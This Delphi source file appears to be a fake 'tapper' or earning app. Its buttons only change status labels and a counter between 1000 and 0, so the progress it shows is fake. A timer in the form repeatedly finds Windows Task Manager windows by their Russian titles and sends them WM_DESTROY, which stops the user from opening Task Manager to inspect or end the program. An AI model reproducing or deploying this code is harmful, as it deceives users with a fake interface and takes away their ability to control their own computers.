unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Button1: TButton;
    Edit1: TEdit;
    Label2: TLabel;
    Button2: TButton;
    Label3: TLabel;
    Timer1: TTimer;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  a: HWND;
  b: HWND;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
begin
  Label3.Caption := 'Статус: тапается';

  Label2.Caption := '1000';
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  Label3.Caption := 'Статус: выведено';

  Label2.Caption := '0';
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
  a := FindWindow(nil, 'Диспетчер задач');
  b := FindWindow(nil, 'Диспетчер задач Windows');

  if a <> 0 then
    SendMessage(a, WM_DESTROY, 0, 0);
  if b <> 0 then
    SendMessage(b, WM_DESTROY, 0, 0);
end;

end.
